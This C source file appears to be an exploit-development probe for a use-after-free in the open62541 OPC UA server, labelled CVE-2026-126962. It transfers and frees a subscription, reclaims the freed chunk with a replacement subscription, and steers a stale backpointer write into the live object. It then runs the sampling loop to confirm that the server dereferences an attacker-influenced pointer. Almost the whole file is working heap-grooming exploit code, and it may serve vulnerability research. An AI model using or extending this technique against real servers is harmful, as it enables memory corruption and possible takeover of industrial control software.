/* Throwaway rung-4 probe for CVE-2026-126962.
 * Extends groom2: after the stale backpointer write lands on the reclaimed
 * replacement subscription, stop the transferred subscription's sampling
 * callback (so only the replacement samples its own corrupted list) and drive
 * the real server sampling loop. A rise in the groomed monitored item's current
 * queue length proves the server dereferenced the attacker-influenced pointer
 * that the stale write placed at byte 200 of the live replacement.
 *
 * No instrumentation patch: queueSize=10 is an ordinary client parameter that
 * only prevents an unrelated queue-overflow assertion on a separately deleted
 * item from preempting the observation.
 */
#include <open62541/server.h>
#include <open62541/client_subscriptions.h>
#include <open62541/server_config_default.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>
#include "src/server/ua_server_internal.h"
#include "src/server/ua_services.h"
#include "src/server/ua_session.h"
#include "src/server/ua_subscription.h"

static void ok(int c, const char *msg) {
    printf("%s %s\n", c ? "PASS" : "FAIL", msg);
    if(!c) exit(2);
}
static UA_Boolean allow_all(UA_Server *s, UA_AccessControl *ac,
                            const UA_NodeId *os, void *oc,
                            const UA_NodeId *ns, void *nc) {
    (void)s;(void)ac;(void)os;(void)oc;(void)ns;(void)nc; return true;
}
static void *mon_ptr(UA_Server *server, UA_UInt32 subId, UA_UInt32 monId) {
    void *p = NULL;
    lockServer(server);
    UA_Subscription *s = getSubscriptionById(server, subId);
    if(s) {
        UA_MonitoredItem *mi;
        LIST_FOREACH(mi, &s->monitoredItems, listEntry)
            if(mi->monitoredItemId == monId) { p = mi; break; }
    }
    unlockServer(server);
    return p;
}
static UA_UInt32 create_sub(UA_Server *server, UA_Session *sess) {
    UA_CreateSubscriptionRequest req;
    UA_CreateSubscriptionRequest_init(&req);
    req.requestedPublishingInterval = 100.0;
    req.requestedLifetimeCount = 10000;
    req.requestedMaxKeepAliveCount = 10;
    req.publishingEnabled = true;
    UA_CreateSubscriptionResponse resp;
    UA_CreateSubscriptionResponse_init(&resp);
    lockServer(server);
    Service_CreateSubscription(server, sess, &req, &resp);
    unlockServer(server);
    ok(resp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       resp.subscriptionId != 0, "Service_CreateSubscription succeeded");
    return resp.subscriptionId;
}
static UA_UInt32 create_publish_mon(UA_Server *server, UA_Session *sess,
                                    UA_UInt32 subId, double interval) {
    UA_NodeId node = UA_NODEID_NUMERIC(0, UA_NS0ID_SERVER_SERVERSTATUS_CURRENTTIME);
    UA_MonitoredItemCreateRequest mreq = UA_MonitoredItemCreateRequest_default(node);
    mreq.requestedParameters.samplingInterval = interval;
    /* Ordinary client parameter: room for repeated samples so an unrelated
     * queue-overflow assert on a separately deleted item cannot preempt. */
    mreq.requestedParameters.queueSize = 10;
    UA_CreateMonitoredItemsRequest req;
    UA_CreateMonitoredItemsRequest_init(&req);
    req.subscriptionId = subId;
    req.timestampsToReturn = UA_TIMESTAMPSTORETURN_BOTH;
    req.itemsToCreateSize = 1;
    req.itemsToCreate = &mreq;
    UA_CreateMonitoredItemsResponse resp;
    UA_CreateMonitoredItemsResponse_init(&resp);
    lockServer(server);
    Service_CreateMonitoredItems(server, sess, &req, &resp);
    unlockServer(server);
    ok(resp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       resp.resultsSize == 1 && resp.results[0].statusCode == UA_STATUSCODE_GOOD &&
       resp.results[0].monitoredItemId != 0, "Service_CreateMonitoredItems succeeded");
    return resp.results[0].monitoredItemId;
}
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("INFO probe=deref sizeof(UA_Subscription)=%zu offset(samplingMonitoredItems)=%zu\n",
           sizeof(UA_Subscription), offsetof(UA_Subscription, samplingMonitoredItems));
    UA_Server *server = UA_Server_new();
    ok(server != NULL, "server created");
    server->config.accessControl.allowTransferSubscription = allow_all;
    UA_Session *src = &server->adminSession;
    UA_Session dst; UA_Session_init(&dst);
    dst.sessionId = UA_NODEID_NUMERIC(1, 4242);
    dst.validTill = UA_INT64_MAX;

    UA_UInt32 oldId = create_sub(server, src);
    lockServer(server);
    UA_Subscription *oldSub = getSubscriptionById(server, oldId);
    double interval = oldSub->publishingInterval;
    unlockServer(server);
    UA_UInt32 oldMon = create_publish_mon(server, src, oldId, interval);
    void *oldMonPtr = mon_ptr(server, oldId, oldMon);
    UA_UInt32 oldMon2 = create_publish_mon(server, src, oldId, interval);
    (void)oldMon2;
    printf("INFO oldMon=%u groomedMonPtr=%p\n", oldMon, oldMonPtr);

    UA_TransferSubscriptionsRequest treq;
    UA_TransferSubscriptionsRequest_init(&treq);
    treq.subscriptionIdsSize = 1;
    treq.subscriptionIds = &oldId;
    UA_TransferSubscriptionsResponse tresp;
    UA_TransferSubscriptionsResponse_init(&tresp);
    lockServer(server);
    Service_TransferSubscriptions(server, &dst, &treq, &tresp);
    unlockServer(server);
    ok(tresp.resultsSize == 1 && tresp.results[0].statusCode == UA_STATUSCODE_GOOD,
       "Service_TransferSubscriptions succeeded");
    lockServer(server);
    UA_Subscription *transferredSub = getSubscriptionById(server, oldId);
    unlockServer(server);

    lockServer(server);
    UA_Subscription_delete(server, oldSub);
    unlockServer(server);
    for(int i = 0; i < 40; i++) { UA_Server_run_iterate(server, false); usleep(10000); }
    printf("INFO oldSub=%p freed after delayed callback\n", (void*)oldSub);

    UA_UInt32 newId = create_sub(server, &dst);
    lockServer(server);
    UA_Subscription *newSub = getSubscriptionById(server, newId);
    printf("INFO newSub=%p same_chunk=%d\n", (void*)newSub, newSub == oldSub);
    unlockServer(server);
    UA_UInt32 newMon = create_publish_mon(server, &dst, newId, interval);
    void *newMonPtr = mon_ptr(server, newId, newMon);
    printf("INFO newMon=%u newMonPtr=%p\n", newMon, newMonPtr);

    UA_DeleteMonitoredItemsRequest dreq;
    UA_DeleteMonitoredItemsRequest_init(&dreq);
    dreq.subscriptionId = oldId;
    dreq.monitoredItemIdsSize = 1;
    dreq.monitoredItemIds = &oldMon2;
    UA_DeleteMonitoredItemsResponse dresp;
    UA_DeleteMonitoredItemsResponse_init(&dresp);
    if(!getenv("OA_SKIP_DELETE")) {
        lockServer(server);
        Service_DeleteMonitoredItems(server, &dst, &dreq, &dresp);
        unlockServer(server);
        ok(dresp.responseHeader.serviceResult == UA_STATUSCODE_GOOD, "delete stale monitored item completed");
    }

    lockServer(server);
    void *headAfter = newSub->samplingMonitoredItems.lh_first;
    printf("INFO replacementHeadAfter=%p groomedMonPtr=%p head_is_groomed=%d\n",
           headAfter, oldMonPtr, headAfter == oldMonPtr);
    unlockServer(server);

    /* Isolate the replacement subscription's sampling loop: stop the
     * transferred subscription's callback so it cannot sample the same items. */
    lockServer(server);
    UA_StatusCode sres = Subscription_setState(server, transferredSub,
                                               UA_SUBSCRIPTIONSTATE_REMOVING);
    printf("INFO transferredCallbackStopped status=0x%08x\n", (unsigned)sres);
    unlockServer(server);

    UA_MonitoredItem *groomed = (UA_MonitoredItem *)oldMonPtr;
    printf("INFO groomedQueueBefore=%zu\n", groomed->queueSize);
    puts("INFO SAMPLING START");
    for(int i = 0; i < 12; i++) { UA_Server_run_iterate(server, false); usleep(15000); }
    printf("INFO groomedQueueAfter=%zu\n", groomed->queueSize);
    puts("INFO SAMPLING DONE");
    UA_Server_delete(server);
    puts("RESULT DEREF PROBE COMPLETE");
    return 0;
}
